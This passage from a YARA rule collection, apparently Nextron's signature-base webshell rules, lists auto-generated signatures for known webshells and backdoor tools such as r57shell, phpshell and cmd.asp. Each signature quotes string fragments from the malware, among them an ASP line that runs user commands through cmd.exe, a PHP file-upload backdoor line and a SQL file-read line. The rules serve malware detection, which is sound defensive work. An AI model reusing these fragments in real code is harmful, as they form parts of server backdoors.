		logic_hash = "58921290952f23ff5b828d8c92c818ebd91b726cdbbc9137b0f55a0e5ca90636"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"

	condition:
		all of them
}

rule SIGNATURE_BASE_BIN_Client_1
{
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "515ab1b3-7923-55de-8c19-71ef5d9b4366"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7578-L7594"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9f0a74ec81bc2f26f16c5c172b80eca7"
		logic_hash = "e1277f6b7adc2e832a3aad96c7e44796596d2e61eb9247977da3c3569777e0b2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "=====Remote Shell Closed====="
		$s2 = "All Files(*.*)|*.*||"
		$s6 = "WSAStartup Error!"
		$s7 = "SHGetFileInfoA"
		$s8 = "CreateThread False!"
		$s9 = "Port Number Error"

	condition:
		4 of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Uptime_1
{
	meta:
		description = "Webshells Auto-generated - file uptime.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4f649757-9502-5640-bc17-11cad6c779f4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7595-L7610"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d1f56102bc5d3e2e37ab3ffa392073b9"
		logic_hash = "5d91dda859a63a965250bd4d76565c6adf18e4ee306be3b91965e5d35bc521e8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "JDiamondCSlC~"
		$s1 = "CharactQA"
		$s2 = "$Info: This file is packed with the UPX executable packer $"
		$s5 = "HandlereateConso"
		$s7 = "ION\\System\\FloatingPo"

	condition:
		all of them
}

rule SIGNATURE_BASE_Simple_PHP_Backdoor_1
{
	meta:
		description = "Webshells Auto-generated - file Simple_PHP_BackDooR.php"
		author = "Florian Roth (Nextron Systems)"
		id = "bd7c19b9-e035-5e70-b626-1d210cadc055"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7611-L7624"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a401132363eecc3a1040774bec9cb24f"
		logic_hash = "9739217c23f583452fbf1d7a8e20b2f1379ebf430e0a4fd73ad62e88d544670a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
		$s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
		$s9 = "// a simple php backdoor"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Sig_2005Gray_1
{
	meta:
		description = "Webshells Auto-generated - file 2005Gray.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "978fb04e-517d-51cf-98ca-5fd6b421365e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7625-L7639"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "75dbe3d3b70a5678225d3e2d78b604cc"
		logic_hash = "927ed5cdaa14b6cd63a6ca7d7bec6635b69fa19d88808890e7d198fb7a0b57b4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
		$s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
		$s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dllinjection_1
{
	meta:
		description = "Webshells Auto-generated - file DllInjection.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8a57e122-fd00-57f3-94db-736c5bfd76db"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7640-L7651"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a7b92283a5102886ab8aee2bc5c8d718"
		logic_hash = "6e01ae1cc8a91a5e0d22bdf477aa72bf0116dbe31752a069b1e34d8a09ec6213"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\BDoor\\DllInjecti"

	condition:
		all of them
}

rule SIGNATURE_BASE_Mithril_V1_45_Mithril_1
{
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3c160017-0332-532a-bb7f-390a4a34dc4e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7652-L7664"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f1484f882dc381dde6eaa0b80ef64a07"
		logic_hash = "a3e74bfb34762553eccaddd745d9e17dc3a5a25201e4bc9e2ea9a49342295c78"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "cress.exe"
		$s7 = "\\Debug\\Mithril."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkshell_Hkrmv_1
{
	meta:
		description = "Webshells Auto-generated - file hkrmv.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "986fad12-9198-5e0a-88d6-a9be6963ff8c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7665-L7677"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "bd3a0b7a6b5536f8d96f50956560e9bf"
		logic_hash = "f1da0778456272e6d93633a564018bdf0fa74f1db1c9e963a03a59c69c752b6e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "/THUMBPOSITION7"
		$s6 = "\\EvilBlade\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_WEBSHELL_PHP_1_1
{
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d0107af3-e484-54cf-a238-dd1e71efd3f6"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "phpshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7678-L7692"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1dccb1ea9f24ffbd085571c88585517b"
		logic_hash = "eed450ae6668bbee01ea2689e9864f10a66714ec4c91afabb12609ad4ebdac8c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
		$s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
		$s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Cmd_1
{
	meta:
		description = "Webshells Auto-generated - file cmd.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "f7a74f21-aec9-5ee7-a80e-0fe34b977a71"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7693-L7705"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cbe8e365d41dd3cd8e462ca434cf385f"
		logic_hash = "43f3379a57210f0e3b70575313115a7ba3d71359de7c5ac9a6a178b93af3545e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
		$s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Phpft_1
{
	meta:
		description = "Webshells Auto-generated - file phpft.php"
		author = "Florian Roth (Nextron Systems)"
		id = "00bc690b-4977-5076-a40a-edd39c37233f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7706-L7718"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "60ef80175fcc6a879ca57c54226646b1"
		logic_hash = "741536acafdc4da618d69bdae2f0a3e8c004a4027cc76c796158ee111c006414"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "PHP Files Thief"
		$s11 = "http://www.4ngel.net"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Indexer_1
{
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "fba053d7-5413-563f-8c27-0554349500b2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7719-L7730"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "135fc50f85228691b401848caef3be9e"
		logic_hash = "a1bfba9c24819f5c1574aa179d853a6cc2fcf58c7b9a14eeab2639248178549c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell_1
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1f1070e8-e82c-5cae-a64a-cd5028adae97"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7731-L7742"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		logic_hash = "40ff6bceb3f9bd95fbf5e75681fadadaa64243007e10fcc86bb909282b8161c5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bdcli100_1
{
	meta:
		description = "Webshells Auto-generated - file bdcli100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c74e8822-9556-5596-a130-c6e0120d7103"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7743-L7755"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b12163ac53789fb4f62e4f17a8c2e028"
		logic_hash = "48c70413c71d5a84f8cea48c77935b7cc26d9e1348d7ab257de4540d69f0f817"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "unable to connect to "
		$s8 = "backdoor is corrupted on "

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_2005Red_1
{
	meta:
		description = "Webshells Auto-generated - file 2005Red.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7756-L7769"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d8ccda2214b3f6eabd4502a050eb8fe8"
		logic_hash = "716b6faa8d1216f592d63b658cdd65d7be0226bf746b5fdf1827bdf881562711"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "scrollbar-darkshadow-color:#FF9DBB;"
		$s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006X2_1
{
	meta:
		description = "Webshells Auto-generated - file 2006X2.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7770-L7782"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cc5bf9fc56d404ebbc492855393d7620"
		logic_hash = "0df587ccaf41d11c6be90ef631ce8b21f95f08fa8f71e62463c378455b312f4a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Powered By "
		$s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."

	condition:
		all of them
}

rule SIGNATURE_BASE_Rdrbs084_1
{
	meta:
		description = "Webshells Auto-generated - file rdrbs084.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "97548273-6894-5c9f-8cca-d966ce770ada"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7783-L7795"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ed30327b255816bdd7590bf891aa0020"
		logic_hash = "8a743d62723c4a5f863f986edd4b149728680b40d6a4b9a99b093d62ccb70cf8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Create mapped port. You have to specify domain when using HTTP type."
		$s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Caseswitch_2005_1
{
	meta:
		description = "Webshells Auto-generated - file 2005.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0f2b8e71-1c11-5efe-bee7-146168aec369"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7796-L7814"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8bf667ee9e21366bc0bd3491cb614f41"
		logic_hash = "0ecf28b5abb918cd1d8f38b76019dddf19dff5dbb114f16ef6ec9b46cb590a46"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "MSComDlg.CommonDialog"
		$s2 = "CommonDialog1"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s5 = "EVENT_SINK_AddRef"
		$s6 = "By Marcos"
		$s7 = "EVENT_SINK_QueryInterface"
		$s8 = "MethCallEngine"

	condition:
		all of them
}

rule SIGNATURE_BASE_Ebayid_Index3_1
{
	meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4fc30150-7b44-53c4-888c-faf651495407"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7815-L7826"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0412b1e37f41ea0d002e4ed11608905f"
		logic_hash = "47660cb71d6787683e51aa14fc0f4a9d6f1c59517b77bfe4135098a0020ded11"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phvayv_1
{
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "07e027a6-01a5-5250-a35e-fbfef1449cfe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7827-L7838"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "205ecda66c443083403efb1e5c7f7878"
		logic_hash = "d0482607f7d9cf6c89963cb9b1f943fa0b80636e857e0fb044cd9a0b3f974deb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byshell063_Ntboot_1
{
	meta:
		description = "Webshells Auto-generated - file ntboot.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7d1f39f6-04f1-51ee-b125-c35af8ae4c0c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7839-L7853"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "99b5f49db6d6d9a9faeffb29fd8e6d8c"
		logic_hash = "2fdc930eacb87d02ebe69a2b64df4103bd0f3417a76f1b2922b3d4cd4c0dffe9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtBoot"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "Dumping Description to Registry..."
		$s3 = "Opening Service .... Failure !"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Casus15_2_1
{
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d3f67fe9-a93f-504a-8b14-a815135d562f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7854-L7865"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8d155b4239d922367af5d0a1b89533a3"
		logic_hash = "45820e0398cca8e75fc4acf6863d962a817afd95a4592acd4ac4a50029684220"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "copy ( $dosya_gonder"

	condition:
		all of them
}

rule SIGNATURE_BASE_Installer_1
{
	meta:
		description = "Webshells Auto-generated - file installer.cmd"
		author = "Florian Roth (Nextron Systems)"
		id = "681d8284-55e5-5316-a0d2-f4f13218df76"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7866-L7878"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a507919ae701cf7e42fa441d3ad95f8f"
		logic_hash = "73c1032313155ceb752fe2f94c8d242833127fe0443d7e3044fa1de2b2b7742b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Restore Old Vanquish"
		$s4 = "ReInstall Vanquish"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remview_2_1
{
	meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "8e0492e8-d683-5c2d-b1ce-6c8344b874af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7879-L7891"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b4a09911a5b23e00b55abe546ded691c"
		logic_hash = "0a682431f7044e9a49c8dd4842a22c521e2a07d5df045b0a12449e3b3206716b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<xmp>$out</"
		$s1 = ".mm(\"Eval PHP code\")."

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_R57_1
{
	meta:
		description = "Webshells Auto-generated - file r57.php"
		author = "Florian Roth (Nextron Systems)"
		id = "14092413-27a4-5b7d-9023-0b53b3d45a12"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7892-L7903"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "903908b77a266b855262cdbce81c3f72"
		logic_hash = "8d0f3b2009594d4aa413c4794dca12e3c66a19974cc6d0b47cc3f5e2572a4c57"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006X_1
{
	meta:
		description = "Webshells Auto-generated - file 2006X.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7904-L7916"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cf3ee0d869dd36e775dfcaa788db8e4b"
		logic_hash = "b71cf90900c7eae4caef57564292ca497a2c6c77e3de2994ba9e4cecae7f2697"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input name=\"password\" type=\"password\" id=\"password\""
		$s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phvayv_2_1
{
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "8bd52f9b-a232-566d-90ab-4085933cdc65"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7917-L7928"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "205ecda66c443083403efb1e5c7f7878"
		logic_hash = "11418a11692412ccb309983bdadd9bda2b27b692c3282eb0386094e76c7ba1e0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"

	condition:
		all of them
}

rule SIGNATURE_BASE_Elmaliseker_1
{
	meta:
		description = "Webshells Auto-generated - file elmaliseker.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7929-L7941"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ccf48af0c8c09bbd038e610a49c9862e"
		logic_hash = "54c0b8e74a9b10fe54901c0595600af1dfc54abd3f710fc20ca87ca92236bb49"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "javascript:Command('Download'"
		$s5 = "zombie_array=array("

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Resolve_1
{
	meta:
		description = "Webshells Auto-generated - file resolve.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dcdb9952-63fc-57a7-ae17-ffe8ac4271f1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7942-L7959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "69bf9aa296238610a0e05f99b5540297"
		logic_hash = "39d8ac274e94f13b5eb197be5827a95ac09df70793bd584c96b81983a565c1ce"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "3^n6B(Ed3"
		$s1 = "^uldn'Vt(x"
		$s2 = "\\= uPKfp"
		$s3 = "'r.axV<ad"
		$s4 = "p,modoi$=sr("
		$s5 = "DiamondC8S t"
		$s6 = "`lQ9fX<ZvJW"

	condition:
		all of them
}

